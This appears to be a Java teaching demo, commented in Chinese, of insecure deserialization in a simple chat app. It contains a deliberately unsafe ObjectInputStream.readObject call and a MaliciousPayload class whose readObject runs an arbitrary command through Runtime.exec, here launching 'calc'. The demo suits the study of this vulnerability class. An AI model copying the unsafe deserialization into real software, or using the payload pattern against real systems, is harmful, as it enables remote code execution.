import java.io.*;
import java.util.Base64;
import java.util.function.Function;

// 消息类（存在漏洞的反序列化目标）
class Message implements Serializable {
    private String content;
    private String type;

    public Message(String content, String type) {
        this.content = content;
        this.type = type;
    }

    @Override
    public String toString() {
        return "[" + type + "] " + content;
    }
}

// 聊天服务类（包含序列化/反序列化功能）
class ChatService {
    // 序列化消息（模拟网络传输）
    Function<Message, byte[]> serialize = msg -> {
        try (ByteArrayOutputStream bos = new ByteArrayOutputStream();
             ObjectOutputStream oos = new ObjectOutputStream(bos)) {
            oos.writeObject(msg);
            return bos.toByteArray();
        } catch (Exception e) {
            throw new RuntimeException("序列化失败");
        }
    };

    // 不安全的反序列化（漏洞点）
    Function<byte[], Object> deserialize = bytes -> {
        try (ByteArrayInputStream bis = new ByteArrayInputStream(bytes);
             ObjectInputStream ois = new ObjectInputStream(bis)) {  // UNSAFE!
            return ois.readObject();
        } catch (Exception e) {
            throw new RuntimeException("反序列化失败");
        }
    };
}

// 消息处理器（模拟网络接收端）
class MessageHandler {
    void processMessage(byte[] rawData) {
        ChatService service = new ChatService();
        Object obj = service.deserialize.apply(rawData);  // 触发反序列化
        
        if (obj instanceof Message) {
            System.out.println("收到消息: " + obj);
        } else {
            System.out.println("未知消息类型");
        }
    }
}

// 恶意类（演示攻击载荷）
class MaliciousPayload implements Serializable {
    private String cmd;
    public MaliciousPayload(String cmd) { this.cmd = cmd; }
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        Runtime.getRuntime().exec(cmd);  // 执行任意命令
    }
}

// 主程序（演示正常流程和攻击流程）
public class ChatApp {
    public static void main(String[] args) {
        ChatService chatService = new ChatService();
        MessageHandler handler = new MessageHandler();

        // 正常用户发送消息
        Message normalMsg = new Message("Hello World", "text");
        byte[] data = chatService.serialize.apply(normalMsg);
        System.out.println("正常消息传输:");
        handler.processMessage(data);

        // 攻击者发送恶意序列化数据
        System.out.println("\
触发恶意反序列化攻击:");
        try {
            // 构造恶意对象
            MaliciousPayload payload = new MaliciousPayload("calc");  // 打开计算器
            byte[] maliciousData = chatService.serialize.apply(payload);
            
            // 模拟Base64传输（常见于网络传输）
            String encoded = Base64.getEncoder().encodeToString(maliciousData);
            byte[] decoded = Base64.getDecoder().decode(encoded);
            
            handler.processMessage(decoded);  // 触发漏洞
        } catch (Exception e) {
            System.err.println("攻击失败: " + e.getMessage());
        }
    }
}